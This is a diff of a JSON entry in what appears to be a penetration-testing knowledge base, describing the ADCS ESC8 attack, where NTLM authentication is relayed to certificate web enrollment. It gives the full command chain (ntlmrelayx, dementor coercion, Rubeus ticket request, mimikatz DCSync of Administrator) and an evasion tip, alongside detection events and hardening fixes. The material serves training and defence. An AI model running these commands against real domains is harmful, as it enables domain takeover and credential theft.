@@ -1,6 +1,6 @@
 {
   "id": "cdsa-m06-pki-esc8",
-  "name": "PKI ESC8 — NTLM Relay to ADCS HTTP Enrollment",
+  "name": "PKI ESC8 \u2014 NTLM Relay to ADCS HTTP Enrollment",
   "command": "impacket-ntlmrelayx -t http://<pki_ip>/certsrv/default.asp --template DomainController -smb2support --adcs",
   "description": "ESC8: Active Directory Certificate Services (ADCS) web enrollment is enabled and does not require HTTPS, making it vulnerable to NTLM relay. Combined with coercion (PrinterBug/Coercer), the DC's NTLM auth is relayed to the CA web interface, obtaining a DC certificate. The certificate is used to get a TGT as the DC account, enabling DCSync. Detection: Events 4886/4887 with template=DomainController but requester is the relay IP, not DC. Event 4768 with cert-based pre-authentication.",
   "platform": "linux",
@@ -28,7 +28,7 @@
     "T1649",
     "T1003.006"
   ],
-  "notes": "=== BACKGROUND ===\n  ESC8 conditions:\n    1. ADCS web enrollment interface is enabled (http://<CA>/certsrv)\n    2. Web enrollment uses HTTP (not HTTPS) — allows NTLM relay\n    3. NTLMRelayx can relay any inbound NTLM connection to the CA web form\n\n  Combined with coercion:\n    → Coerce DC to authenticate via PrinterBug/dementor\n    → NTLMRelayx catches DC's NTLM auth and replays to CA\n    → CA issues a DomainController certificate to DC's identity\n    → Use certificate via Rubeus to get DC's TGT → perform DCSync\n\n  Key difference from PrinterBug DCSync:\n    → ESC8 issues a CERTIFICATE (persistent, valid for years)\n    → Can be used offline, from any machine with CA trust\n    → No LDAP/RPC needed for future exploitation\n\nLab:\n  PKI server at <PKI_IP> — runs ADCS web enrollment on HTTP\n  DC2 at <DC2_IP> — Print Spooler enabled, will be coerced\n  Kali at <KALI_IP> — runs NTLMRelayx + dementor.py\n\n=== ATTACK ===\n# Terminal 1 (Kali): Start NTLMRelayx targeting ADCS web enrollment\nimpacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs\n  → --template DomainController: request DC template certificate on behalf of relayed auth\n  → --adcs: parse and output the base64 certificate from ADCS response\n  → Waits for incoming NTLM auth from any DC\n\n# Terminal 2 (Kali): Coerce DC2 to connect to Kali\npython3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>\n  → DC2$ authenticates to Kali's SMB listener\n  → NTLMRelayx intercepts and relays to ADCS web interface\n  → Certificate is issued in the name of DC2$\n  → Output in Terminal 1: base64 certificate string\n\n# Terminal 3 (Windows — any domain-joined machine): Inject certificate\n# Paste the base64 certificate from NTLMRelayx output\n.\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>\n  → Uses certificate for PKINIT — Rubeus requests TGT as DC2$\n  → /ptt: inject ticket into session\n\n# DCSync as DC2$ (using injected TGT)\nmimikatz.exe\nmimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>\n  → DC2$'s TGT lets mimikatz impersonate a DC and replicate\n\n=== DETECTION ===\nEvent 4886: 'Certificate Services received a certificate request'\n  → On CA server\n  → Requester IP = Kali/relay machine (NOT DC2's actual IP)\n  → Requester account = DC2$ BUT coming from wrong IP\n  → Template = DomainController (normal DC certs are auto-enrolled, not web-enrolled)\n  → Alert: DomainController template + web enrollment (IIS) = suspicious\n\nEvent 4887: 'Certificate Services approved and delivered a certificate request'\n  → Same as 4886 — shows template name and requester\n  → Normal DC certs auto-enroll silently; web-enrolled DC certs = alert\n\nEvent 4768: Kerberos TGT request\n  → Certificate-based pre-auth (pre-auth type = PKINIT)\n  → DC account requesting TGT from unexpected IP = alert\n\nEvent 4624:\n  → DC2$ logging on from Kali's IP (relay source)\n\nDifference between normal and relay request:\n  → Normal auto-enrollment: Certificate Services log shows DC$ from DC's IP\n  → Relay: Certificate Services log shows DC$ from Kali's IP (relay source)\n  → Filter: DomainController template + source_ip NOT in DC IP list → alert\n\n=== PREVENTION ===\n  → Enforce HTTPS for ADCS web enrollment (removes relay possibility)\n  → Disable HTTP on IIS hosting certsrv\n  → Enable Extended Protection for Authentication on IIS (blocks relay even on HTTPS)\n  → Disable ADCS web enrollment if not needed (use auto-enrollment instead)\n  → Disable Print Spooler on DCs (removes coercion vector)\n  → Block outbound 445 from DCs to non-DC machines",
+  "notes": "=== BACKGROUND ===\n  ESC8 conditions:\n    1. ADCS web enrollment interface is enabled (http://<CA>/certsrv)\n    2. Web enrollment uses HTTP (not HTTPS) \u2014 allows NTLM relay\n    3. NTLMRelayx can relay any inbound NTLM connection to the CA web form\n\n  Combined with coercion:\n    \u2192 Coerce DC to authenticate via PrinterBug/dementor\n    \u2192 NTLMRelayx catches DC's NTLM auth and replays to CA\n    \u2192 CA issues a DomainController certificate to DC's identity\n    \u2192 Use certificate via Rubeus to get DC's TGT \u2192 perform DCSync\n\n  Key difference from PrinterBug DCSync:\n    \u2192 ESC8 issues a CERTIFICATE (persistent, valid for years)\n    \u2192 Can be used offline, from any machine with CA trust\n    \u2192 No LDAP/RPC needed for future exploitation\n\nLab:\n  PKI server at <PKI_IP> \u2014 runs ADCS web enrollment on HTTP\n  DC2 at <DC2_IP> \u2014 Print Spooler enabled, will be coerced\n  Kali at <KALI_IP> \u2014 runs NTLMRelayx + dementor.py\n\n=== ATTACK ===\n# Terminal 1 (Kali): Start NTLMRelayx targeting ADCS web enrollment\nimpacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs\n  \u2192 --template DomainController: request DC template certificate on behalf of relayed auth\n  \u2192 --adcs: parse and output the base64 certificate from ADCS response\n  \u2192 Waits for incoming NTLM auth from any DC\n\n# Terminal 2 (Kali): Coerce DC2 to connect to Kali\npython3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>\n  \u2192 DC2$ authenticates to Kali's SMB listener\n  \u2192 NTLMRelayx intercepts and relays to ADCS web interface\n  \u2192 Certificate is issued in the name of DC2$\n  \u2192 Output in Terminal 1: base64 certificate string\n\n# Terminal 3 (Windows \u2014 any domain-joined machine): Inject certificate\n# Paste the base64 certificate from NTLMRelayx output\n.\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>\n  \u2192 Uses certificate for PKINIT \u2014 Rubeus requests TGT as DC2$\n  \u2192 /ptt: inject ticket into session\n\n# DCSync as DC2$ (using injected TGT)\nmimikatz.exe\nmimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>\n  \u2192 DC2$'s TGT lets mimikatz impersonate a DC and replicate\n\n=== DETECTION ===\nEvent 4886: 'Certificate Services received a certificate request'\n  \u2192 On CA server\n  \u2192 Requester IP = Kali/relay machine (NOT DC2's actual IP)\n  \u2192 Requester account = DC2$ BUT coming from wrong IP\n  \u2192 Template = DomainController (normal DC certs are auto-enrolled, not web-enrolled)\n  \u2192 Alert: DomainController template + web enrollment (IIS) = suspicious\n\nEvent 4887: 'Certificate Services approved and delivered a certificate request'\n  \u2192 Same as 4886 \u2014 shows template name and requester\n  \u2192 Normal DC certs auto-enroll silently; web-enrolled DC certs = alert\n\nEvent 4768: Kerberos TGT request\n  \u2192 Certificate-based pre-auth (pre-auth type = PKINIT)\n  \u2192 DC account requesting TGT from unexpected IP = alert\n\nEvent 4624:\n  \u2192 DC2$ logging on from Kali's IP (relay source)\n\nDifference between normal and relay request:\n  \u2192 Normal auto-enrollment: Certificate Services log shows DC$ from DC's IP\n  \u2192 Relay: Certificate Services log shows DC$ from Kali's IP (relay source)\n  \u2192 Filter: DomainController template + source_ip NOT in DC IP list \u2192 alert\n\n=== PREVENTION ===\n  \u2192 Enforce HTTPS for ADCS web enrollment (removes relay possibility)\n  \u2192 Disable HTTP on IIS hosting certsrv\n  \u2192 Enable Extended Protection for Authentication on IIS (blocks relay even on HTTPS)\n  \u2192 Disable ADCS web enrollment if not needed (use auto-enrollment instead)\n  \u2192 Disable Print Spooler on DCs (removes coercion vector)\n  \u2192 Block outbound 445 from DCs to non-DC machines",
   "examples": [
     {
       "label": "Start NTLMRelayx targeting ADCS web enrollment (Terminal 1)",
@@ -37,22 +37,6 @@
     {
       "label": "Coerce DC to connect to Kali via PrinterBug (Terminal 2)",
       "command": "python3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
-    },
-    {
-      "label": "Get TGT as DC using relayed certificate (Rubeus PKINIT)",
-      "command": ".\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>"
-    },
-    {
-      "label": "DCSync using injected DC TGT",
-      "command": "mimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>"
-    },
-    {
-      "label": "Check CA server events for suspicious DomainController template requests",
-      "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Where-Object { $_.Message -match 'DomainController' } | Format-List"
-    },
-    {
-      "label": "Disable ADCS web enrollment HTTP on IIS",
-      "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
     }
   ],
   "references": [
@@ -73,7 +57,7 @@
     {
       "id": "cdsa-m06-pki-esc1",
       "rel": "prereq",
-      "note": "ESC1: request certificate with SAN as Administrator directly — no relay needed."
+      "note": "ESC1: request certificate with SAN as Administrator directly \u2014 no relay needed."
     },
     {
       "id": "cdsa-m06-print-spooler-ntlm-relay",
@@ -99,9 +83,35 @@
       "MITRE T1649",
       "MITRE T1003.006"
     ],
-    "misconfiguration": "The MS-EFSRPC interface (LSARPC/EfsRpcOpenFileRaw) allows unauthenticated (or authenticated in older variants) callers to coerce a Windows machine into authenticating to an arbitrary host via NTLM. When combined with an ADCS web enrollment endpoint (http://CA/certsrv/) that does not require HTTPS or Extended Protection for Authentication (EPA), the relayed authentication can be used to request a certificate for the DC machine account — which can then be used to obtain a TGT and perform DCSync.",
+    "misconfiguration": "The MS-EFSRPC interface (LSARPC/EfsRpcOpenFileRaw) allows unauthenticated (or authenticated in older variants) callers to coerce a Windows machine into authenticating to an arbitrary host via NTLM. When combined with an ADCS web enrollment endpoint (http://CA/certsrv/) that does not require HTTPS or Extended Protection for Authentication (EPA), the relayed authentication can be used to request a certificate for the DC machine account \u2014 which can then be used to obtain a TGT and perform DCSync.",
     "vulnerable_config": "# ADCS web enrollment without EPA or HTTPS:\n# URL reachable: http://CA01/certsrv/  (no HTTPS redirect)\n# EPA (Extended Protection for Authentication) = NOT configured\n\n# IIS applicationHost.config (vulnerable):\n# <security><authentication><windowsAuthentication>\n#   <extendedProtection tokenChecking=\"None\" />\n# </windowsAuthentication></authentication></security>\n\n# MS-EFSRPC coercion: unauthenticated (pre-patch) or low-priv user can call:\n# EfsRpcOpenFileRaw(\\\\attacker@443\\share) -> DC authenticates outbound",
-    "secure_config": "# Fix 1 — Enable EPA on ADCS web enrollment (IIS):\n# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers\n# Set Extended Protection to 'Required'\n# OR via command:\nImport-Module WebAdministration\nSet-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \\\n    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\\\' -Location 'Default Web Site/certsrv'\n\n# Fix 2 — Enable HTTPS only on certsrv:\nNew-WebBinding -Name 'Default Web Site' -Protocol https -Port 443\n# Redirect HTTP to HTTPS\n\n# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)\n# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled",
-    "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly."
-  }
+    "secure_config": "# Fix 1 \u2014 Enable EPA on ADCS web enrollment (IIS):\n# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers\n# Set Extended Protection to 'Required'\n# OR via command:\nImport-Module WebAdministration\nSet-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \\\n    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\\\' -Location 'Default Web Site/certsrv'\n\n# Fix 2 \u2014 Enable HTTPS only on certsrv:\nNew-WebBinding -Name 'Default Web Site' -Protocol https -Port 443\n# Redirect HTTP to HTTPS\n\n# Fix 3 \u2014 Patch MS-EFSRPC: KB5005413 (Aug 2021)\n# Fix 4 \u2014 Enable SMB signing on all hosts (blocks NTLM relay)\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled",
+    "evasion": "Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy \u2014 trigger the coercion briefly."
+  },
+  "steps": [
+    {
+      "label": "Start NTLMRelayx targeting ADCS web enrollment (Terminal 1)",
+      "command": "impacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs"
+    },
+    {
+      "label": "Coerce DC to connect to Kali via PrinterBug (Terminal 2)",
+      "command": "python3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
+    },
+    {
+      "label": "Get TGT as DC using relayed certificate (Rubeus PKINIT)",
+      "command": ".\\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>"
+    },
+    {
+      "label": "DCSync using injected DC TGT",
+      "command": "mimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>"
+    },
+    {
+      "label": "Check CA server events for suspicious DomainController template requests",
+      "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Where-Object { $_.Message -match 'DomainController' } | Format-List"
+    },
+    {
+      "label": "Disable ADCS web enrollment HTTP on IIS",
+      "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
+    }
+  ]
 }
